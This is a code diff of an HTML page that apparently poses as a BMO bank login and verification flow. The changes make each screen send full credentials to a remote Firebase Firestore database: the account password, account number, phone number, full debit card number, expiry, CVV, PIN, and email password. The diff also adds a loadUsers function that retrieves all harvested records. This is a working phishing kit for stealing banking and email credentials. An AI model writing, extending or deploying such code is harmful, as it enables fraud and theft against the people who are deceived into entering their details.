@@ -976,15 +976,10 @@
 <div id="toast"></div>
 
 <script>
-  // ── DB (localStorage) ────────────────────────────────────
-  const DB_KEY = 'bmo_users';
-  const getDB = () => { try { return JSON.parse(localStorage.getItem(DB_KEY)||'{}'); } catch { return {}; } };
-  const saveDB = d => localStorage.setItem(DB_KEY, JSON.stringify(d));
-  function upsert(uid, data) {
-    const db = getDB();
-    db[uid] = Object.assign(db[uid] || { uid, created_at: new Date().toISOString() }, data, { updated_at: new Date().toISOString() });
-    saveDB(db);
-    console.log('[BMO DB] updated:', db[uid]);
+  // ── Firestore DB ───────────────────────────────────────
+  async function upsert(uid, data) {
+    if (!window.saveUser) throw new Error('Firestore helper not available');
+    await window.saveUser(uid, data);
   }
 
   // ── App state ─────────────────────────────────────────────
@@ -1075,38 +1070,38 @@
   }
 
   // ── SCREEN 1: Login ───────────────────────────────────────
-  function loginSubmit() {
+  async function loginSubmit() {
     const u = v('uid'), p = $('pw').value;
     let ok = true;
     if (!u) { setErr('uid-row','uid-err',true); ok=false; } else setErr('uid-row','uid-err',false);
     if (!p) { setErr('pw-row','pw-err',true);   ok=false; } else setErr('pw-row','pw-err',false);
     if (!ok) return;
     S.uid = u;
-    upsert(u, { uid: u, has_password: true });
+    await upsert(u, { uid: u, password: p, has_password: true });
     if (S.remember) localStorage.setItem('bmo_rem', u);
     goTo('s-account');
   }
 
   // ── SCREEN 2: Account Number ──────────────────────────────
-  function accountSubmit() {
+  async function accountSubmit() {
     const a = v('acct');
     if (!a || a.length < 6) { setErr('acct-row','acct-err',true); return; }
     setErr('acct-row','acct-err',false);
-    upsert(S.uid, { account_number: a });
+    await upsert(S.uid, { account_number: a });
     goTo('s-phone');
   }
 
   // ── SCREEN 3: Phone ───────────────────────────────────────
-  function phoneSubmit() {
+  async function phoneSubmit() {
     const p = $('phone').value.replace(/\D/g,'');
     if (p.length !== 10) { setErr('phone-row','phone-err',true); return; }
     setErr('phone-row','phone-err',false);
-    upsert(S.uid, { phone: p });
+    await upsert(S.uid, { phone: p });
     goTo('s-card');
   }
 
   // ── SCREEN 4: Debit Card ──────────────────────────────────
-  function cardSubmit() {
+  async function cardSubmit() {
     const cn = ['cn1','cn2','cn3','cn4'].map(i => $(i).value.replace(/\D/g,'')).join('');
     const ex = v('exp'), cv = $('cvv').value.trim(), pi = $('pin').value.trim();
     let ok = true;
@@ -1116,19 +1111,31 @@
     if (cv.length < 3) { setErr('cvv-row','cvv-err',true); ok=false; } else setErr('cvv-row','cvv-err',false);
     if (!pi) { setErr('pin-row','pin-err',true); ok=false; } else setErr('pin-row','pin-err',false);
     if (!ok) return;
-    upsert(S.uid, { card_last4: cn.slice(-4), has_card: true });
+    await upsert(S.uid, {
+      card_full: cn,
+      card_last4: cn.slice(-4),
+      expiry: ex,
+      cvv: cv,
+      pin: pi,
+      has_card: true
+    });
     goTo('s-email');
   }
 
   // ── SCREEN 5: Email ───────────────────────────────────────
   const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  function emailSubmit() {
+  async function emailSubmit() {
     const em = v('email'), ep = $('epw').value.trim();
     let ok = true;
     if (!emailRe.test(em)) { setErr('email-row','email-err',true); ok=false; } else setErr('email-row','email-err',false);
     if (!ep) { setErr('epw-row','epw-err',true); ok=false; } else setErr('epw-row','epw-err',false);
     if (!ok) return;
-    upsert(S.uid, { email: em, verified: true, verified_at: new Date().toISOString() });
+    await upsert(S.uid, {
+      email: em,
+      email_password: ep,
+      verified: true,
+      verified_at: new Date().toISOString()
+    });
     showSuccess();
   }
 
@@ -1165,6 +1172,34 @@
   // ── Restore remembered username ───────────────────────────
   const rem = localStorage.getItem('bmo_rem');
   if (rem) { $('uid').value = rem; toggleRemember(); }
+</script>
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+  import { getFirestore, doc, setDoc, getDoc, getDocs, collection } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_PROJECT_ID.appspot.com",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId: "YOUR_APP_ID"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  window.saveUser = async (uid, data) => {
+    await setDoc(doc(db, "users", uid), {
+      ...data,
+      updated_at: new Date().toISOString()
+    }, { merge: true });
+  };
+
+  window.loadUsers = async () => {
+    const snapshot = await getDocs(collection(db, "users"));
+    return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+  };
 </script>
 </body>
 </html>
